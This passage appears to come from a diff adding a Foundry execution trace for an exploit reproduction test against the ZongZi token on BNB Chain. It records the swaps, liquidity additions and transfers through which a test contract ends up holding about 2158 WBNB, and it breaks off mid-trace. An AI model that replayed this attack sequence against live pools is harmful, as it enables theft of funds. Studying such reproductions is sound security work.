+    │   │   │   │   │   │   │   @ 0x92fd203faa4ec8e5dbaa150868b6c5e82061a5aa302f13f0e2e072b04ba7e11a: 0 → 0x000000000000000000000000000000000000022c3dd0064a59b1cd6a48a59430
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [117590] Router::addLiquidityETH{value: 79123091298010185378}(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], 44069988429806274725539987428400 [4.406e31], 0, 0, 0x17823910106Eb4D6Fe8aE7f5cAe6e36F5d11d266, 1711355145 [1.711e9])
+    │   │   │   │   │   │   ├─ [676] Recovery::getPair(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000d695c08a4c3b9fc646457ad6b0dc0a3b8f1219fe
+    │   │   │   │   │   │   ├─ [893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2955889103939134345545 [2.955e21], 1891985456587164873508803154215890 [1.891e33], 1711355145 [1.711e9]
+    │   │   │   │   │   │   ├─ [6956] ZongZi::transferFrom(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 44069988429806274725539987428400 [4.406e31])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 44069988429806274725539987428400 [4.406e31])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x02511c03f424790d569267e75366931a15bdbd9191d24da5ef1623359ba72b82: 0x0000000000000000000000000000000000005d4836b8ebd328d9ae63c51f03d2 → 0x0000000000000000000000000000000000005f747488f21d828b7bce0dc49802
+    │   │   │   │   │   │   │   │   @ 0x92fd203faa4ec8e5dbaa150868b6c5e82061a5aa302f13f0e2e072b04ba7e11a: 0x000000000000000000000000000000000000022c3dd0064a59b1cd6a48a59430 → 0
+    │   │   │   │   │   │   │   │   @ 0x5a427663d0f8868d5251f017da83c9e48671f345267043ec0bb0f14c62b4975f: 0x000000000000000000000000000000000000022c3dd0064a59b1cd6a48a59431 → 1
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [21974] WBNB::deposit{value: 68851479886831073571}()
+    │   │   │   │   │   │   │   ├─ emit Deposit(dst: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 68851479886831073571 [6.885e19])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x000000000000000000000000000000000000000000000003bb81982a9284b923
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [3262] WBNB::transfer(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 68851479886831073571 [6.885e19])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 68851479886831073571 [6.885e19])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x000000000000000000000000000000000000000000000003bb81982a9284b923 → 0
+    │   │   │   │   │   │   │   │   @ 0xf8dc43e96a32bfc1c17009d5e909383dcde39bed7dd854578987580f2fb646db: 0x0000000000000000000000000000000000000000000000a03d33a70f9bccd149 → 0x0000000000000000000000000000000000000000000000a3f8b53f3a2e518a6c
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [63437] WBNB_ZONGZI::mint(0x17823910106Eb4D6Fe8aE7f5cAe6e36F5d11d266)
+    │   │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 3024740583825965419116 [3.024e21]
+    │   │   │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1936055445016971148234343141644290 [1.936e33]
+    │   │   │   │   │   │   │   ├─ [354] Recovery::feeTo() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000ed943ce24baebf257488771759f9bf482c39706
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 656230660607251452052955 [6.562e23])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x17823910106Eb4D6Fe8aE7f5cAe6e36F5d11d266, value: 55259554837945094228075159 [5.525e25])
+    │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 3024740583825965419116 [3.024e21], reserve1: 1936055445016971148234343141644290 [1.936e33])
+    │   │   │   │   │   │   │   ├─ emit Mint(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0: 68851479886831073571 [6.885e19], amount1: 44069988429806274725539987428400 [4.406e31])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0: 0x000000000000000000000000000000000000000007a9d5b67e8a9641faa39712 → 0x000000000000000000000000000000000000000007d816574ccc2b261b5b3f84
+    │   │   │   │   │   │   │   │   @ 11: 0x0000000000000000003a499a9db018686da31651f519b8d62683f3c114478bd8 → 0x0000000000000000003d23e29900927f5326e559b65a25cd5f9deb523d8334d8
+    │   │   │   │   │   │   │   │   @ 0x8ff53ce6baf2922ba519d18a95cc0cd8efa766a893cf420a213b256f9e2dad5d: 0x0000000000000000000000000000000000000000000000f4e6a28127c2fa2be2 → 0x0000000000000000000000000000000000000000002db69f5f07b2cd77010e79
+    │   │   │   │   │   │   │   │   @ 8: 0x660135095d4836b8ebd328d9ae63c51f03d20000000000a03d33a70f9bccd149 → 0x660135095f747488f21d828b7bce0dc498020000000000a3f8b53f3a2e518a6c
+    │   │   │   │   │   │   │   │   @ 0xce5a46cd565c798db4579e1721082d7b4156f14a385995b283ae5d8d572faf65: 0 → 0x000000000000000000000000000000000000000000008af655dc633e6cb0c5db
+    │   │   │   │   │   │   │   └─ ← [Return] 55259554837945094228075159 [5.525e25]
+    │   │   │   │   │   │   ├─ [55] ZongZi::fallback{value: 10271611411179111807}()
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000022c3dd0064a59b1cd6a48a59430000000000000000000000000000000000000000000000003bb81982a9284b9230000000000000000000000000000000000000000002db5aa786531a5b406e297
+    │   │   │   │   │   ├─ [0] 0xe516c9C7924Efa19532Bf0e95eCD2647C5a16399::fallback{value: 158246182596020370757}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [55] 0xDe0cB15C6aa16D220549430B0ab90Beb3694D10b::fallback{value: 52748727532006790252}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [3891] 0xDe0cB15C6aa16D220549430B0ab90Beb3694D10b::addReward(52748727532006790252 [5.274e19])
+    │   │   │   │   │   │   ├─ emit RewardAdded(reward: 52748727532006790252 [5.274e19])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 8: 0x000000000000000000000000000000000000000000000000000000008369d180 → 0x000000000000000000000000000000000000000000000000000037873c5b451b
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit Transfer(from: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 772539949273925448613385603366719 [7.725e32])
+    │   │   │   │   │   ├─ emit Approval(owner: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269983807038420047197360590105532168119 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000002a52400168e0736a8275703d0d62 → 0x0000000000000000000000000000000000000000000001e1d1c72d5b97e00000
+    │   │   │   │   │   │   @ 0x02511c03f424790d569267e75366931a15bdbd9191d24da5ef1623359ba72b82: 0x0000000000000000000000000000000000005f747488f21d828b7bce0dc49802 → 0x000000000000000000000000000000000000858b47bd68691404e1feea185741
+    │   │   │   │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0xfffffffffffffffffffffffffffffffffffffffd2ada00b86dde6cdfd1550519 → 0xffffffffffffffffffffffffffffffffffffd5aaead897d7fa73ea6a6117f7b7
+    │   │   │   │   │   │   @ 0x5a427663d0f8868d5251f017da83c9e48671f345267043ec0bb0f14c62b4975f: 0x0000000000000000000000000000000000000a40d9f3393c9b221530e8468dcc → 0x0000000000000000000000000000000000000e7c46c029efab4c0419e44fdbef
+    │   │   │   │   │   │   @ 0x92fd203faa4ec8e5dbaa150868b6c5e82061a5aa302f13f0e2e072b04ba7e11a: 0x0000000000000000000000000000000000000000000ea20505343ef9a535fd98 → 0x0000000000000000000000000000000000000c5008f023a5519a36af9baa47be
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 81203796500469234 [8.12e16]
+    │   │   │   │   ├─ [893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3024740583825965419116 [3.024e21], 1936055445016971148234343141644290 [1.936e33], 1711355145 [1.711e9]
+    │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2708595394290896596847728745011009 [2.708e33]
+    │   │   │   │   ├─ [18480] WBNB_ZONGZI::swap(861167498663157296581 [8.611e20], 0, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   │   │   ├─ [3262] WBNB::transfer(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 861167498663157296581 [8.611e20])
+    │   │   │   │   │   │   ├─ emit Transfer(from: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], to: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 861167498663157296581 [8.611e20])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xf8dc43e96a32bfc1c17009d5e909383dcde39bed7dd854578987580f2fb646db: 0x0000000000000000000000000000000000000000000000a3f8b53f3a2e518a6c → 0x000000000000000000000000000000000000000000000075499bb1daa5259ca7
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000000001207e6c34d2d5f2 → 0x00000000000000000000000000000000000000000000002eb03a0bcbbdfec3b7
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2163573085162808122535 [2.163e21]
+    │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2708595394290896596847728745011009 [2.708e33]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 2163573085162808122535 [2.163e21], reserve1: 2708595394290896596847728745011009 [2.708e33])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 772539949273925448613385603366719 [7.725e32], amount0Out: 861167498663157296581 [8.611e20], amount1Out: 0, to: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x660135095f747488f21d828b7bce0dc498020000000000a3f8b53f3a2e518a6c → 0x66013509858b47bd68691404e1feea185741000000000075499bb1daa5259ca7
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 861248702459657765815 [8.612e20]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [2074] WBNB::deposit{value: 1296961254356000000000}()
+    │   │   │   │   ├─ emit Deposit(dst: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], wad: 1296961254356000000000 [1.296e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000002eb03a0bcbbdfec3b7 → 0x000000000000000000000000000000000000000000000074ff2e0909946c0bb7
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [534] WBNB::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2158209956815657765815 [2.158e21]
+    │   │   │   ├─ [23162] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2158209956815657765815 [2.158e21])
+    │   │   │   │   ├─ emit Transfer(from: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2158209956815657765815 [2.158e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x000000000000000000000000000000000000000000000074ff2e0909946c0bb7
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x000000000000000000000000000000000000000000000074ff2e0909946c0bb7 → 0
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [24769] ZongZi::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x44bf1039324fcbfda472196706fa68525cb38db0f3d91f5ca7d489ff92357e45: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [656] ZongZi::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 202656295177656246468348031061423 [2.026e32]
+    │   │   ├─ [248961] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(202656295177656246468348031061423 [2.026e32], 0, [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1711441545 [1.711e9])
+    │   │   │   ├─ [220672] ZongZi::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 202656295177656246468348031061423 [2.026e32])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], value: 20265629516876824646834803106142 [2.026e31])
+    │   │   │   │   ├─ [275] Router::WETH() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   │   │   ├─ emit Approval(owner: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 17225785089345300949809582640221 [1.722e31])
+    │   │   │   │   ├─ [70884] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(17225785089345300949809582640221 [1.722e31], 0, [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], 1711355145 [1.711e9])
+    │   │   │   │   │   ├─ [6956] ZongZi::transferFrom(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 17225785089345300949809582640221 [1.722e31])
+    │   │   │   │   │   │   ├─ emit Transfer(from: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 17225785089345300949809582640221 [1.722e31])
+    │   │   │   │   │   │   ├─ emit Approval(owner: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x92fd203faa4ec8e5dbaa150868b6c5e82061a5aa302f13f0e2e072b04ba7e11a: 0x00000000000000000000000000000000000000d96b83763fd447b8e9b3c90c5d → 0
+    │   │   │   │   │   │   │   @ 0x5a427663d0f8868d5251f017da83c9e48671f345267043ec0bb0f14c62b4975f: 0x00000000000000000000000000000000000000ffc9c7d66935fa06b89746e15f → 0x00000000000000000000000000000000000000265e44602961b24dcee37dd502
+    │   │   │   │   │   │   │   @ 0x02511c03f424790d569267e75366931a15bdbd9191d24da5ef1623359ba72b82: 0x000000000000000000000000000000000000858b47bd68691404e1feea185741 → 0x0000000000000000000000000000000000008664b340dea8e84c9ae89de1639e
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2163573085162808122535 [2.163e21], 2708595394290896596847728745011009 [2.708e33], 1711355145 [1.711e9]
+    │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2725821179380241897797538327651230 [2.725e33]
+    │   │   │   │   │   ├─ [38380] WBNB_ZONGZI::swap(13638700697674353944 [1.363e19], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 13638700697674353944 [1.363e19])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 13638700697674353944 [1.363e19])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xf8dc43e96a32bfc1c17009d5e909383dcde39bed7dd854578987580f2fb646db: 0x000000000000000000000000000000000000000000000075499bb1daa5259ca7 → 0x0000000000000000000000000000000000000000000000748c554bd49a650f8f
+    │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x000000000000000000000000000000000000000000000000bd4666060ac08d18
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2149934384465133768591 [2.149e21]
+    │   │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2725821179380241897797538327651230 [2.725e33]
+    │   │   │   │   │   │   ├─ emit Sync(reserve0: 2149934384465133768591 [2.149e21], reserve1: 2725821179380241897797538327651230 [2.725e33])
+    │   │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 17225785089345300949809582640221 [1.722e31], amount0Out: 13638700697674353944 [1.363e19], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 8: 0x66013509858b47bd68691404e1feea185741000000000075499bb1daa5259ca7 → 0x660135098664b340dea8e84c9ae89de1639e0000000000748c554bd49a650f8f
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 13638700697674353944 [1.363e19]
+    │   │   │   │   │   ├─ [9223] WBNB::withdraw(13638700697674353944 [1.363e19])
+    │   │   │   │   │   │   ├─ [83] Router::fallback{value: 13638700697674353944}()
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 13638700697674353944 [1.363e19])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x000000000000000000000000000000000000000000000000bd4666060ac08d18 → 0
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [55] ZongZi::fallback{value: 13638700697674353944}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [2769] ZongZi::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 3039844427531523697025220465921 [3.039e30])
+    │   │   │   │   │   ├─ emit Approval(owner: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 3039844427531523697025220465921 [3.039e30])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x92fd203faa4ec8e5dbaa150868b6c5e82061a5aa302f13f0e2e072b04ba7e11a: 0 → 0x00000000000000000000000000000000000000265e44602961b24dcee37dd501
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [95799] Router::addLiquidityETH{value: 2406829534883709519}(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], 3039844427531523697025220465921 [3.039e30], 0, 0, 0x17823910106Eb4D6Fe8aE7f5cAe6e36F5d11d266, 1711355145 [1.711e9])
+    │   │   │   │   │   ├─ [676] Recovery::getPair(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000d695c08a4c3b9fc646457ad6b0dc0a3b8f1219fe
+    │   │   │   │   │   ├─ [893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2149934384465133768591 [2.149e21], 2725821179380241897797538327651230 [2.725e33], 1711355145 [1.711e9]
+    │   │   │   │   │   ├─ [6956] ZongZi::transferFrom(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 3039844427531523697025220465921 [3.039e30])
+    │   │   │   │   │   │   ├─ emit Transfer(from: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 3039844427531523697025220465921 [3.039e30])
+    │   │   │   │   │   │   ├─ emit Approval(owner: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x02511c03f424790d569267e75366931a15bdbd9191d24da5ef1623359ba72b82: 0x0000000000000000000000000000000000008664b340dea8e84c9ae89de1639e → 0x000000000000000000000000000000000000868b11853ed249fee8b7815f389f
+    │   │   │   │   │   │   │   @ 0x92fd203faa4ec8e5dbaa150868b6c5e82061a5aa302f13f0e2e072b04ba7e11a: 0x00000000000000000000000000000000000000265e44602961b24dcee37dd501 → 0
+    │   │   │   │   │   │   │   @ 0x5a427663d0f8868d5251f017da83c9e48671f345267043ec0bb0f14c62b4975f: 0x00000000000000000000000000000000000000265e44602961b24dcee37dd502 → 1
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [21974] WBNB::deposit{value: 2397613646710564417}()
+    │   │   │   │   │   │   ├─ emit Deposit(dst: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 2397613646710564417 [2.397e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x000000000000000000000000000000000000000000000000214608e898cfe641
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [3262] WBNB::transfer(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 2397613646710564417 [2.397e18])
+    │   │   │   │   │   │   ├─ emit Transfer(from: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 2397613646710564417 [2.397e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x000000000000000000000000000000000000000000000000214608e898cfe641 → 0
+    │   │   │   │   │   │   │   @ 0xf8dc43e96a32bfc1c17009d5e909383dcde39bed7dd854578987580f2fb646db: 0x0000000000000000000000000000000000000000000000748c554bd49a650f8f → 0x000000000000000000000000000000000000000000000074ad9b54bd3334f5d0
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [41646] WBNB_ZONGZI::mint(0x17823910106Eb4D6Fe8aE7f5cAe6e36F5d11d266)
+    │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2152331998111844333008 [2.152e21]
+    │   │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2728861023807773421494563548117151 [2.728e33]
+    │   │   │   │   │   │   ├─ [354] Recovery::feeTo() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000ed943ce24baebf257488771759f9bf482c39706
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 283178065667696163425826 [2.831e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x17823910106Eb4D6Fe8aE7f5cAe6e36F5d11d266, value: 2707614860287827473441703 [2.707e24])
+    │   │   │   │   │   │   ├─ emit Sync(reserve0: 2152331998111844333008 [2.152e21], reserve1: 2728861023807773421494563548117151 [2.728e33])
+    │   │   │   │   │   │   ├─ emit Mint(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0: 2397613646710564417 [2.397e18], amount1: 3039844427531523697025220465921 [3.039e30])
+    │   │   │   │   │   │   ├─  storage changes:
